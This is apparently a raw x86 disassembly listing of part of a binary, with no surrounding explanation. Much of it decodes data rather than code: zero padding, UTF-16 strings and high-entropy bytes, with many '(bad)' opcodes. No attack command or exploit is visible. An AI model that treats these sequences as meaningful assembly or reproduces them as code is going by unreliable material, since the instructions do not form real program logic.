  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	je     0x413bf7
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    DWORD PTR [ebx+0x0],eax
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	call   0xdc4ac2ed
  413f05:	rol    DWORD PTR [eax],1
  413f07:	add    BYTE PTR ds:0x16000001,al
  413f0d:	and    BYTE PTR [eax+0x14],dh
  413f10:	mov    edx,0x799cf883
  413f15:	xor    bl,bh
  413f17:	dec    edx
  413f18:	push   cs
  413f19:	jecxz  0x413f21
  413f1b:	cs mov dh,0xb2
  413f1e:	cld    
  413f1f:	das    
  413f20:	outs   dx,DWORD PTR ds:[esi]
  413f21:	aam    0xda
  413f23:	cdq    
  413f24:	out    dx,al
  413f25:	fs sahf 
  413f27:	mov    esi,0xb6a40b9
  413f2c:	sbb    al,0xa9
  413f2e:	add    eax,0x17ed736e
  413f33:	and    cl,bl
  413f35:	mov    al,ds:0xad5c4110
  413f3a:	out    dx,al
  413f3b:	xor    ebp,esi
  413f3d:	test   al,0xad
  413f3f:	test   eax,0xc836d198
  413f44:	mov    esi,0xc7c5f624
  413f49:	ins    BYTE PTR es:[edi],dx
  413f4a:	shl    edi,1
  413f4c:	mov    esp,0x11821955
  413f51:	dec    edi
  413f52:	pmulhw mm4,QWORD PTR [esi]
  413f55:	test   DWORD PTR gs:[eax-0x63],ebx
  413f59:	scas   eax,DWORD PTR es:[edi]
  413f5a:	popf   
  413f5b:	jge    0x413fd0
  413f5d:	mov    ds:0xdd8a1be6,eax
  413f62:	cwde   
  413f63:	ret    0x63e2
  413f66:	cs jnp 0x413f43
  413f69:	sbb    BYTE PTR [esi+0x71aa62cb],ah
  413f6f:	jl     0x413f4c
  413f71:	scas   eax,DWORD PTR es:[edi]
  413f72:	mov    edx,0x8739fe3b
  413f77:	test   BYTE PTR ss:[edi-0x85bb073],al
  413f7e:	sahf   
  413f7f:	jge    0x413f8e
  413f81:	adc    al,cl
  413f83:	cli    
  413f84:	inc    edx
  413f85:	imul   BYTE PTR [eax+0xc]
  413f88:	mov    bl,0x51
  413f8a:	(bad)  
  413f8b:	(bad)  
  413f8c:	iret   
  413f8d:	stos   DWORD PTR es:[edi],eax
  413f8e:	jg     0x41400c
  413f90:	pop    esp
  413f91:	xlat   BYTE PTR ds:[ebx]
  413f92:	mov    eax,0x1b47bbda
  413f97:	out    0x94,al
  413f99:	in     al,0x48
  413f9b:	jle    0x413feb
  413f9d:	dec    esi
  413f9e:	pushf  
  413f9f:	cmp    ecx,ebx
  413fa1:	repz inc edi
  413fa3:	or     DWORD PTR [ebx],0x87dbd662
  413fa9:	fild   WORD PTR [ecx]
  413fab:	jbe    0x413f50
  413fad:	pop    ds
  413fae:	fwait
  413faf:	and    eax,0x1e42d957
  413fb4:	mov    edx,0x7702d230
  413fb9:	and    al,0x85
  413fbb:	mov    bl,0xdc
  413fbd:	cmc    
  413fbe:	adc    BYTE PTR [eax+esi*2+0x5d],dh
  413fc2:	and    esp,DWORD PTR [ebp+0x5a]
  413fc5:	out    dx,al
  413fc6:	push   cs
  413fc7:	xchg   DWORD PTR [ecx+0x2e],edi
  413fca:	and    DWORD PTR [ebp+0x46],edi
  413fcd:	stos   BYTE PTR es:[edi],al
  413fce:	adc    al,0x20
  413fd0:	pop    esi
  413fd1:	or     al,0xa9
  413fd4:	test   eax,0xcc112b4a
  413fd9:	or     DWORD PTR [edi],edi
  413fdb:	inc    edi
  413fdc:	addr16 or eax,0x1ac80c7b
  413fe2:	mov    eax,0x3cacc277
  413fe7:	lahf   
  413fe8:	inc    esp
  413fe9:	gs out 0x15,al
  413fec:	pop    edi
  413fed:	mov    dl,0x9f
  413fef:	inc    edi
  413ff0:	mov    dl,0x68
  413ff2:	imul   edx,edi,0xc0e3869c
  413ff8:	call   0x542aa561
  413ffd:	(bad)  
  413ffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fff:	rcl    DWORD PTR [ebx],1
  414001:	xor    al,0xc3
  414003:	inc    ebp
  414004:	(bad)  
  414005:	inc    BYTE PTR [ebp+0x10]
  414008:	mov    BYTE PTR [edx],dh
  41400a:	mov    DWORD PTR [esi],esi
  41400c:	mov    al,ds:0x8e28cf20
	...
  414071:	add    BYTE PTR [eax],al
  414073:	add    BYTE PTR [edx-0x26],bl
  414076:	push   esi
  414077:	pusha  
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x6bc3:0xc8d52e96
  414083:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414084:	loope  0x414058
  414086:	add    BYTE PTR [eax],al
  414088:	add    eax,0xe6000001
  41408d:	sub    al,0xf9
  41408f:	int3   
  414090:	imul   esp,DWORD PTR [ebp+0x14],0xfdbb547c
  414097:	inc    esp
  414098:	data16 or al,BYTE PTR [ebx-0x6c6e4eac]
  41409f:	cmp    edx,ebp
  4140a1:	das    
  4140a2:	clc    
  4140a3:	push   es
  4140a4:	or     esi,esi
  4140a6:	jge    0x4140fd
  4140a8:	mov    esi,0xf209ada4
  4140ad:	enter  0x8b5f,0x12
  4140b1:	(bad)  
  4140b2:	push   edx
  4140b3:	pop    es
  4140b4:	mov    esi,0xcbb72332
  4140b9:	lahf   
  4140ba:	mov    ch,BYTE PTR [ebp+0x71]
  4140bd:	test   al,0xda
  4140bf:	add    al,0x4e
  4140c1:	fisttp WORD PTR [ebp-0x2f6592dd]
  4140c7:	in     al,0x6c
  4140c9:	ins    DWORD PTR es:[edi],dx
  4140ca:	ss sbb edx,esi
  4140cd:	aad    0x6a
  4140cf:	cmc    
  4140d0:	and    BYTE PTR [esi+0x0],0x2f
  4140d4:	fisub  WORD PTR [ebx]
  4140d6:	fldcw  WORD PTR [edx]
  4140d8:	xor    al,0xbe
  4140da:	sub    BYTE PTR [eax+0x6],bl
  4140dd:	push   0x1c20c879
  4140e2:	xor    BYTE PTR [edx-0x115e7d7d],0x47
  4140e9:	(bad)  
  4140ea:	fcomp  QWORD PTR [ecx]
  4140ec:	into   
  4140ed:	xor    ecx,DWORD PTR [esi]
  4140ef:	mov    eax,ds:0xc9b48aa0
  4140f4:	aas    
  4140f5:	aad    0x6a
  4140f7:	xchg   esp,eax
  4140f8:	sbb    BYTE PTR [ebx],al
  4140fa:	iret   
  4140fb:	jno    0x4140cf
  4140fd:	push   cs
  4140fe:	ds inc ebp
  414100:	ror    edx,cl
  414102:	sbb    al,0x6
  414104:	(bad)  
  414106:	outs   dx,BYTE PTR ds:[esi]
  414107:	ror    ch,cl
  414109:	shr    BYTE PTR [eax+0xdd5958e],1
  41410f:	ficomp WORD PTR [ebx+ebx*1-0x46]
  414113:	aaa    
  414114:	mov    ebx,0x3b4e96a2
  414119:	mov    bh,0x29
  41411b:	jmp    0x4140e4
  41411d:	int3   
  41411e:	and    esp,DWORD PTR [edi+0x31]
  414121:	xchg   esp,eax
  414122:	add    eax,DWORD PTR [edi]
  414124:	pop    ebp
  414125:	lds    esp,FWORD PTR [ecx+eiz*4]
  414128:	icebp  
  414129:	cmp    BYTE PTR [ebp-0x75],0x63
  41412d:	les    edi,FWORD PTR [edi]
  41412f:	xor    edx,DWORD PTR [esi+0x45]
  414132:	adc    DWORD PTR [eax+0x5a],ecx
  414135:	pushf  
  414136:	rcr    ecx,cl
  414138:	pop    esp
  414139:	retf   0x5f7
  41413c:	inc    esp
  41413d:	(bad)  
  41413e:	(bad)  
  41413f:	cmp    ecx,DWORD PTR [eax-0xd]
  414142:	mov    ecx,eax
  414144:	inc    edx
  414145:	ret    
  414146:	lods   eax,DWORD PTR ds:[esi]
  414147:	jae    0x4141ac
  414149:	ret    0xaa0c
  41414c:	pop    eax
  41414d:	xchg   esi,eax
  41414e:	push   es
  41414f:	out    dx,al
  414150:	pop    eax
  414151:	push   es
  414152:	hlt    
  414153:	sub    eax,0x72328ec5
  414158:	push   eax
  414159:	fld    QWORD PTR [edi+eiz*8+0x4e989e22]
  414160:	js     0x414154
  414162:	mov    dl,0xf7
  414164:	ins    BYTE PTR es:[edi],dx
  414165:	in     eax,dx
  414166:	(bad)  
  414167:	hlt    
  414168:	sub    BYTE PTR [ecx+eiz*2-0x63],bl
  41416c:	mov    ch,0x5
  41416e:	stos   DWORD PTR es:[edi],eax
  41416f:	jge    0x4141cf
  414171:	nop
  414172:	xchg   esi,eax
  414173:	mov    ah,0x74
  414175:	rol    ecx,1
  414177:	mov    dh,0x7c
  414179:	icebp  
  41417a:	fadd   DWORD PTR [ebp+0x277d3f87]
  414180:	or     ah,bh
  414182:	pop    esi
  414183:	or     DWORD PTR [ebx],eax
  414185:	cmp    dl,al
  414187:	mov    esi,0x81275469
  41418c:	test   eax,0x4bbb700
	...
  4141f1:	add    BYTE PTR [eax],al
  4141f3:	add    BYTE PTR [edx],al
  4141f5:	adc    al,BYTE PTR [ecx]
  4141f7:	mov    ds:0xb3a2b311,eax
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	nop
  414201:	or     BYTE PTR [ebx],bl
  414203:	ins    DWORD PTR es:[edi],dx
  414204:	out    0xd3,al
  414206:	add    BYTE PTR [eax],al
  414208:	add    eax,0x95000001
  41420d:	cdq    
  41420e:	push   cs
  41420f:	aas    
  414210:	call   0x35f2:0xbf3eab80
  414217:	stos   BYTE PTR es:[edi],al
  414218:	enter  0x1a7f,0x7d
  41421c:	xchg   BYTE PTR [edx+eax*4-0x2bb504c4],cl
  414223:	sub    ebx,DWORD PTR [ecx]
  414225:	mov    edi,0x3b21250d
  41422a:	lds    edx,FWORD PTR [esi+0x1b]
  41422d:	xchg   ebx,eax
  41422e:	in     eax,dx
  41422f:	ds stos BYTE PTR es:[edi],al
  414231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414232:	fwait
  414233:	pop    eax
  414234:	mov    dh,0x5b
  414236:	cmp    ax,WORD PTR [esi]
  414239:	dec    edi
  41423a:	cmp    DWORD PTR [edx+0x42329b19],ebx
  414240:	(bad)  
  414241:	out    dx,eax
  414242:	jbe    0x4141ef
  414244:	lds    esp,FWORD PTR [ecx-0x1efe7fdc]
  41424a:	pop    ebp
  41424b:	retf   0xd511
  41424e:	hlt    
  41424f:	and    ebx,0x60
  414252:	dec    eax
  414253:	mov    bh,0xf9
  414255:	hlt    
  414256:	mov    al,0x71
  414258:	mov    dh,0xa5
  41425a:	imul   bl
  41425c:	(bad)  
  41425d:	enter  0xa133,0x9b
  414261:	inc    edx
  414262:	cmc    
  414263:	jmp    0x9b7c:0xc6bfbdcb
  41426a:	mov    ebp,DWORD PTR [eax+0x6]
  41426d:	adc    DWORD PTR [edx+0x288a1e45],ebx
  414273:	pop    ebx
  414274:	loope  0x4142e4
  414276:	sbb    eax,0x1bd81549
  41427b:	hlt    
  41427c:	xor    al,0x74
  41427e:	(bad)  
  41427f:	fnstsw WORD PTR [esp+ecx*2]
  414282:	xlat   BYTE PTR ds:[ebx]
  414283:	popa   
  414284:	or     DWORD PTR [eax-0x71],0xea8bc11f
  41428b:	cmp    dh,ch
  41428d:	mov    bh,0xd0
  41428f:	lea    edi,[edx+ebp*8]
  414292:	enter  0xa378,0xc2
  414296:	sbb    BYTE PTR [edi-0x6a],dl
  414299:	aad    0x22
  41429b:	neg    BYTE PTR [edx+0xfcd71f]
  4142a1:	stc    
  4142a2:	or     BYTE PTR [ecx+0x29],bh
  4142a5:	add    al,0x29
  4142a7:	hlt    
  4142a8:	test   ch,al
  4142aa:	into   
  4142ab:	sbb    al,0xc7
  4142ad:	test   BYTE PTR [ebx-0x5b],bh
  4142b0:	push   ds
  4142b1:	retf   
  4142b2:	pop    ebp
  4142b3:	mov    edx,?
  4142b5:	cwde   
  4142b6:	ss dec esi
  4142b8:	sar    DWORD PTR [edx+0x6df90d23],0x95
  4142bf:	popf   
  4142c0:	ss jmp 0x5eefab3c
  4142c6:	or     edi,edx
  4142c8:	arpl   WORD PTR ss:[esi+0x29],bp
  4142cc:	jle    0x4142bb
  4142ce:	aam    0xfc
  4142d0:	push   0x11
  4142d2:	fwait
  4142d3:	stos   BYTE PTR es:[edi],al
  4142d4:	push   eax
  4142d5:	hlt    
  4142d6:	push   ebx
  4142d7:	fdivr  DWORD PTR [edx+0x61]
  4142da:	jb     0x414291
  4142dc:	adc    cl,BYTE PTR [esi]
  4142de:	fistp  DWORD PTR ds:0xcf8e8e1d
  4142e4:	neg    ah
  4142e6:	int3   
  4142e7:	nop
  4142e8:	cmp    BYTE PTR [ebx+eiz*8+0x6f],bl
  4142ec:	repz popf 
  4142ee:	jns    0x41434a
  4142f0:	pop    ebp
  4142f1:	scas   eax,DWORD PTR es:[edi]
  4142f2:	mov    ecx,0x913c460f
  4142f7:	clc    
  4142f8:	add    BYTE PTR [eax],cl
  4142fa:	aas    
  4142fb:	pop    edx
  4142fc:	stos   BYTE PTR es:[edi],al
  4142fd:	dec    edi
  4142fe:	push   ecx
  4142ff:	pop    eax
  414300:	sbb    BYTE PTR [ecx-0x13ae60fd],ch
  414306:	mov    al,0x4f
  414308:	push   edx
  414309:	xlat   BYTE PTR ds:[ebx]
  41430a:	cmp    eax,edx
  41430c:	pop    ebx
  41430d:	jbe    0x414338
  41430f:	push   esi
  414310:	mov    dl,0x0
	...
  414372:	add    BYTE PTR [eax],al
  414374:	add    DWORD PTR [ecx-0x2122293],eax
  41437a:	mov    cl,0xdd
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	jbe    0x414379
  414382:	adc    al,0xa1
  414384:	jmp    0x41435a
  414386:	add    BYTE PTR [eax],al
  414388:	add    eax,0x85000001
  41438d:	jb     0x414338
  41438f:	in     al,0xdf
  414391:	je     0x4143b5
  414393:	nop
  414394:	dec    eax
  414395:	je     0x414358
  414397:	arpl   WORD PTR [ebx+0xa],sp
  41439a:	jmp    0x33aab820
  41439f:	std    
  4143a0:	lods   eax,DWORD PTR ds:[esi]
  4143a1:	push   eax
  4143a2:	inc    esp
  4143a3:	daa    
  4143a4:	out    0xbb,eax
  4143a6:	in     al,0x5d
  4143a8:	(bad)  
  4143a9:	fidiv  DWORD PTR [ecx]
  4143ab:	xor    al,0x3d
  4143ad:	inc    edx
  4143ae:	push   eax
  4143af:	cdq    
  4143b0:	mov    ah,0x57
  4143b2:	mov    edi,0xf48652e4
  4143b7:	sub    al,0x8a
  4143b9:	fstp   TBYTE PTR [edx]
  4143bb:	mov    ds:0xbe1f7052,eax
  4143c0:	repnz mov ebp,0xed3b4181
  4143c6:	lahf   
  4143c7:	loope  0x414425
  4143c9:	aam    0x60
  4143cb:	push   ds
  4143cc:	out    dx,eax
  4143cd:	scas   eax,DWORD PTR es:[edi]
  4143ce:	or     cl,ah
  4143d0:	cmp    al,0xd
  4143d2:	test   BYTE PTR [edi-0x39b38333],cl
  4143d8:	fsub   QWORD PTR [ecx+ebp*2-0x4e]
  4143dd:	fidiv  DWORD PTR [ebx+0x41]
  4143e0:	into   
  4143e1:	or     DWORD PTR [edx+0x16051a55],esi
  4143e7:	out    0x7f,al
  4143e9:	add    eax,0x1ccf5199
  4143ee:	das    
  4143ef:	addr16 mov al,0xb6
  4143f2:	je     0x4143ef
  4143f4:	sub    cl,BYTE PTR [ecx]
  4143f6:	rcr    BYTE PTR [ebx],0xab
  4143f9:	fcomp  DWORD PTR [edi]
  4143fb:	retf   
  4143fc:	push   edi
  4143fd:	push   0xfffffff9
  4143ff:	mov    dh,0xa5
  414401:	ret    0x87ee
  414404:	jno    0x41444a
  414406:	mov    esi,0xdab9d2d1
  41440b:	sub    dl,BYTE PTR [esi]
  41440d:	or     bh,cl
  41440f:	add    al,BYTE PTR ds:0xa90371ae
  414415:	outs   dx,BYTE PTR ds:[esi]
  414416:	mov    esi,0xd37d36c7
  41441b:	sub    al,ah
  41441d:	gs sbb ebp,esi
  414420:	jp     0x4143dd
  414422:	(bad)  
  414423:	out    dx,al
  414424:	das    
  414425:	push   eax
  414426:	pushf  
  414427:	mov    ch,0x90
  414429:	retf   
  41442a:	(bad)  
  41442b:	loopne 0x4143ee
  41442d:	sub    edi,DWORD PTR [edi+eax*8-0x39309c79]
  414434:	cmp    edx,DWORD PTR [eax+esi*8-0x68c3ca57]
  41443b:	ins    BYTE PTR es:[edi],dx
  41443c:	scas   al,BYTE PTR es:[edi]
  41443d:	mov    dh,0xf6
  41443f:	scas   eax,DWORD PTR es:[edi]
  414440:	or     al,0xc1
  414442:	hlt    
  414443:	cwde   
  414444:	jmp    0xae8c:0xb887787e
  41444b:	stos   BYTE PTR es:[edi],al
